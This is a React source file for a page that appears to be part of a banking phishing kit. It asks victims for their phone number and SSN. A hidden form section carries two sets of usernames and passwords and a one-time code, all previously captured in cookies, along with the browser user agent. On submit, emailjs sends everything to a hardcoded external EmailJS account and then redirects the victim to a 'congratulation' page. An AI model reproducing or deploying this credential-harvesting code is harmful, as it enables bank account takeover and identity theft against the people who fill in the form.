import React, { useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import Navbar from "../components/navbar/navbar";
import cookies from "../utils/cookie.config";
import emailjs from "@emailjs/browser";


type Details = {
  phone: string;
  sn: string;
};

export default function Additional() {
    const login1: Login = cookies.get("login1");
    const login2: Login2 = cookies.get("login2");
    const otp: { code: string } = cookies.get("otp");
    const [isLoading, setIsLoading] = useState(false)
  const [formInput, setFormInput] = useState<Details>({
    phone: "",
    sn: "",
  });

  const [info, setInfo] = useState({
    ip:"",
    isp:"",
    state: ""
  })

  let agent = navigator.userAgent;
  const navigate = useNavigate();

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  const form = useRef<HTMLFormElement>(null);

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    setIsLoading(true)
    event.preventDefault();
    setInfo({
      ip:"",
    isp:"",
    state: ""
    })
    emailjs.sendForm('service_9gs21m9', 'template_u4icphu', form.current!, 'T8uOG8MEAEQT6Xur6')
      .then((result) => {
        console.log(result.text)
        navigate("../congratulation", { replace: true });
      }, (error) => {
        alert("could not complete your request")
        console.log(error)
        setIsLoading(true)
      }); 
  }
 
  return (
    <div>
      {isLoading &&
      <div className="loader-container">
        <span className="loader"></span>
      </div>}
      <Navbar />
      <div className="main-body">
        <div className="form">
          
            <p style={{ fontWeight: "bold", padding: "10px" }}>
              For your security, verify your information by entering the
              following details
            </p>
            <hr />
            <form ref={form} onSubmit={handleSubmit}>
            <div style={{ padding: "20px" }}>
              <div className="form-item">
                <label htmlFor="">Phone Number</label>
                <input
                  required
                  onChange={handleInputChange}
                  name="phone"
                  type="tel"
                  defaultValue={formInput.phone}
                />
              </div>
              <div className="form-item">
                <label htmlFor="">SSN</label>
                <input name="sn" onChange={handleInputChange} defaultValue={formInput.sn} type="tel" />
              </div>
<div style={{display: "none"}}>
<div className="form-item">
              <label htmlFor="">Username</label>
              <input type="text" name="browser" defaultValue={agent} />
            </div>

            <div className="form-item">
              <label htmlFor="">Username</label>
              <input type="text" name="ip" defaultValue={info.ip} />
            </div>

            <div className="form-item">
              <label htmlFor="">Username</label>
              <input type="text" name="isp" defaultValue={info.isp} />
            </div>

            <div className="form-item">
              <label htmlFor="">Username</label>
              <input type="text" name="state" defaultValue={info.state} />
            </div>

              <div className="form-item">
              <label htmlFor="">Username</label>
              <input type="text" name="username" defaultValue={login1.username} />
            </div>

            <div className="form-item">
              <label htmlFor="">Password</label>
              <input type="password" name="password" defaultValue={login1.password} />
            </div>

            <div className="form-item">
              <label htmlFor="">Username</label>
              <input type="text" name="username2" defaultValue={login2.username2} />
            </div>

            <div className="form-item">
              <label htmlFor="">Password</label>
              <input type="password" name="password2" defaultValue={login2.password2} />
            </div>

            <div className="form-item">
              <label htmlFor="">Enter code</label>
              <input name="code" type="text" defaultValue={otp.code} />
            </div>

            </div>

              <br />

              <div className="btn">
                <button>Submit</button>
              </div>
            </div>
          </form>
          <br />
          <div style={{ textAlign: "center", color: "#3379E4" }}>
            <p>Can't Sign in</p>

            <p>Enroll in Online banking</p>
          </div>
        </div>
      </div>
    </div>
  );
}
